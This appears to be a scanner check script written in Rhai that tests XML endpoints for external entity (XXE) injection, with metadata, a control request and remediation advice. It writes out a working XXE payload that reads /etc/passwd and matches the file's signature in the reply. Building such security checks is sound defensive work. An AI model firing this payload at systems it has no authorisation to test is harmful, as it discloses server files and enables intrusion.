// check-xxe.rhai — catalogue check `xxe`, class `xxe`.
//
// An XML parser left with external entities enabled will fetch whatever a
// document's DOCTYPE points it at. The probe replaces the whole body with a
// small document whose one entity names a file every POSIX system has, and
// looks for that file's signature in the reply. It declares no recursive or
// self-expanding entity, so there is no billion-laughs amplification; one
// entity resolves once.
//
// `kinds: ["entire_body"]` because the document *is* the payload — the point
// owns the content type and the length (spec D4).
//
// OWASP A05 Security Misconfiguration. CWE-611.
const NAME = "check-xxe";
const API  = "1";

const NIX_SIG = "root:.*:0:0:";

const META = #{
    id: "xxe",
    name: "XML external entity (XXE) injection",
    class: "xxe",
    lanes: ["http"],
    kinds: ["entire_body"],
    intensity: "medium",
    cost: "light",
    technique: "reflected",
    severity: "critical",
    confidence_max: "firm",
    needs_baseline: false,
    cwe: 611,
    description: "Replaces an XML body with a document declaring one external entity and reports when the parser resolves it and returns the file.",
    remediation: "Disable DOCTYPE processing and external entity resolution in the XML parser; most parsers have one flag for it.",
};

fn load(reg) {
    reg.add_check(META, |point| {
        // The element name is the job's own marker, the token the job stamps
        // its traffic with. The host mints it fresh on every call, so it is
        // taken once here and the same value builds the document, the
        // evidence and the hint: the document quoted in the finding is
        // byte-for-byte the document that was sent, and an operator can
        // replay it.
        let tag = probe.marker();
        let reference = "&" + tag + ";";
        let document = `<?xml version="1.0"?>` +
            `<!DOCTYPE ${tag} [<!ENTITY ${tag} SYSTEM "file:///etc/passwd">]>` +
            `<${tag}>` + reference + `</${tag}>`;
        // The control is the same document with no DOCTYPE and no entity.
        let control = `<?xml version="1.0"?><${tag}>1</${tag}>`;

        let reply = probe.send(document);
        if regex_match(NIX_SIG, reply.body) {
            return #{
                outcome: "vulnerable",
                confidence: "firm",
                evidence: #{ payload: document, matched: "system file signature" },
                detail: `The XML endpoint resolved an external entity and returned local file contents. XXE gives file disclosure and often server-side request forgery too.`,
                poc_hint: #{
                    matchers: [ #{ type: "regex", regex: NIX_SIG, part: "body" } ],
                    control: #{
                        payload: control,
                        matchers: [ #{ not: #{ type: "regex", regex: NIX_SIG, part: "body" } } ],
                    },
                },
            };
        }

        #{
            outcome: "clean",
            confidence: "firm",
            evidence: #{ payload: document, matched: () },
            detail: "The endpoint returned no file contents: it either rejects a DOCTYPE or does not parse XML here.",
        }
    });
}
